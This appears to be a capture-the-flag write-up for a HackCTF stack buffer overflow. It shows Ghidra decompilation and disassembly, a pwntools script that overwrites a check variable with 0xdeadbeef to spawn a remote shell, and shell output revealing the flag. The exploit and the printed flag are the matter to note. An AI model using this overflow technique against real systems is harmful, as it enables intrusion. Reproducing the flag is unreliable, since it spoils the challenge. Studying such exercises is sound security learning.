@@ -1,0 +1,153 @@
+using Ghidra
+
+undefined4 main(undefined1 param_1) <-String main 
+
+{
+  char local_3c [40]; 
+  int local_14; 
+  undefined1 *local_c;
+  
+  local_c = &param_1;  
+  local_14 = 0x4030201; <- int local_14; 
+  fgets(local_3c,0x2d,stdin); <- char local_3c [40];
+  printf("\n[buf]: %s\n",local_3c);
+  printf("[check] %p\n",local_14);
+  if ((local_14 != 0x4030201) && (local_14 != -0x21524111)) {
+    puts("\nYou are on the right way!");
+  }
+  if (local_14 == -0x21524111) {
+    puts("Yeah dude! You win!\nOpening your shell...");
+    system("/bin/dash");
+    puts("Shell closed! Bye.");
+  }
+  return 0;
+}
+
+                             **************************************************************
+                             *                          FUNCTION                          *
+                             **************************************************************
+                             undefined4 __cdecl main(undefined1 param_1)
+             undefined4        EAX:4          <RETURN>
+             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     080484cb(*)  
+             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     080484d2(R)  
+             undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     08048581(R)  
+             undefined4        Stack[-0x14]:4 local_14                                XREF[5]:     080484dc(W), 
+                                                                                                   08048511(R), 
+                                                                                                   08048521(R), 
+                                                                                                   0804852a(R), 
+                                                                                                   08048543(R)  
+             undefined1        Stack[-0x3c]:1 local_3c                                XREF[2]:     080484ee(*), 
+                                                                                                   080484fd(*)  
+                             main                                            XREF[4]:     Entry Point(*), 
+                                                                                          _start:080483e7(*), 080486a0, 
+                                                                                          080486fc(*)  
+        080484cb 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4] <- counter
+        080484cf 83 e4 f0        AND        ESP,0xfffffff0           
+        080484d2 ff 71 fc        PUSH       dword ptr 
+        080484d5 55              PUSH       EBP
+        080484d6 89 e5           MOV        EBP,ESP
+        080484d8 51              PUSH       ECX
+        080484d9 83 ec 34        SUB        ESP,0x34
+        080484dc c7 45 f4        MOV        dword ptr [EBP + local_14],0x4030201
+                 01 02 03 04
+        080484e3 a1 40 a0        MOV        EAX,[stdin]
+                 04 08
+        080484e8 83 ec 04        SUB        ESP,0x4
+        080484eb 50              PUSH       EAX
+        080484ec 6a 2d           PUSH       0x2d
+        080484ee 8d 45 cc        LEA        EAX=>local_3c,[EBP + -0x34] <-system call local_3c,[EBP + -0x34]
+        080484f1 50              PUSH       EAX
+        080484f2 e8 89 fe        CALL       fgets                                            char * fgets(char * __s, int __n
+                 ff ff
+        080484f7 83 c4 10        ADD        ESP,0x10
+        080484fa 83 ec 08        SUB        ESP,0x8
+        080484fd 8d 45 cc        LEA        EAX=>local_3c,[EBP + -0x34] <-system call local_3c,[EBP + -0x34]
+        08048500 50              PUSH       EAX
+        08048501 68 10 86        PUSH       s__[buf]:_%s_08048610                            = "\n[buf]: %s\n"
+                 04 08
+        08048506 e8 65 fe        CALL       printf                                           int printf(char * __format, ...)
+                 ff ff
+        0804850b 83 c4 10        ADD        ESP,0x10
+        0804850e 83 ec 08        SUB        ESP,0x8
+        08048511 ff 75 f4        PUSH       dword ptr [EBP + local_14]
+        08048514 68 1c 86        PUSH       s_[check]_%p_0804861c                            = "[check] %p\n"
+                 04 08
+        08048519 e8 52 fe        CALL       printf                                           int printf(char * __format, ...)
+                 ff ff
+        0804851e 83 c4 10        ADD        ESP,0x10
+        08048521 81 7d f4        CMP        dword ptr [EBP + local_14],0x4030201
+                 01 02 03 04
+        08048528 74 19           JZ         LAB_08048543
+        0804852a 81 7d f4        CMP        dword ptr [EBP + local_14],0xdeadbeef
+                 ef be ad de
+        08048531 74 10           JZ         LAB_08048543
+        08048533 83 ec 0c        SUB        ESP,0xc
+        08048536 68 28 86        PUSH       s__You_are_on_the_right_way!_08048628            = "\nYou are on the right way!"
+                 04 08
+        0804853b e8 50 fe        CALL       puts                                             int puts(char * __s)
+                 ff ff
+        08048540 83 c4 10        ADD        ESP,0x10
+                             LAB_08048543                                    XREF[2]:     08048528(j), 08048531(j)  
+        08048543 81 7d f4        CMP        dword ptr [EBP + local_14],0xdeadbeef
+                 ef be ad de
+        0804854a 75 30           JNZ        LAB_0804857c
+        0804854c 83 ec 0c        SUB        ESP,0xc
+        0804854f 68 44 86        PUSH       s_Yeah_dude!_You_win!_Opening_your_08048644      = "Yeah dude! You win!\nOpening 
+                 04 08
+        08048554 e8 37 fe        CALL       puts                                             int puts(char * __s)
+                 ff ff
+        08048559 83 c4 10        ADD        ESP,0x10
+        0804855c 83 ec 0c        SUB        ESP,0xc
+        0804855f 68 6e 86        PUSH       s_/bin/dash_0804866e                             = "/bin/dash"
+                 04 08
+        08048564 e8 37 fe        CALL       system                                           int system(char * __command)
+                 ff ff
+        08048569 83 c4 10        ADD        ESP,0x10
+        0804856c 83 ec 0c        SUB        ESP,0xc
+        0804856f 68 78 86        PUSH       s_Shell_closed!_Bye._08048678                    = "Shell closed! Bye."
+                 04 08
+        08048574 e8 17 fe        CALL       puts                                             int puts(char * __s)
+                 ff ff
+        08048579 83 c4 10        ADD        ESP,0x10
+                             LAB_0804857c                                    XREF[1]:     0804854a(j)  
+        0804857c b8 00 00        MOV        EAX,0x0
+                 00 00
+        08048581 8b 4d fc        MOV        ECX,dword ptr [EBP + local_c]
+        08048584 c9              LEAVE
+        08048585 8d 61 fc        LEA        ESP,[ECX + -0x4]
+        08048588 c3              RET
+c++ code
+int main(){
+    cout << "Octal 8->" << 0x34<< "\n";
+    cout << "Octal 8->" << 0xc<< "\n";
+    cout << 0x34-0xc<< "\n";
+    }
+   
+Octal 8->52
+Octal 8->12
+40 <-
+
+>>> from pwn import *
+>>> p32(0xdeadbeef)
+b'\xef\xbe\xad\xde'
+>>> 
+
+
+from pwn import *
+p = remote("ctf.j0n9hyun.xyz","3000")
+payload = 'A'*40+"\xef\xbe\xad\xde"
+p.sendline(payload)
+p.interactive()
+p.close()
+$ ls
+flag
+main
+$ cat flag
+HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}
+$ ls -al
+total 20
+drwxr-xr-x 2 root   root 4096 Oct  2 16:31 .
+drwxr-xr-x 9 root   root 4096 Oct  2 16:31 ..
+-r-xrwx--x 1 attack root   45 Nov  8  2018 flag
+-r-xrwx--x 1 attack root 7500 Nov  8  2018 main
+$ 
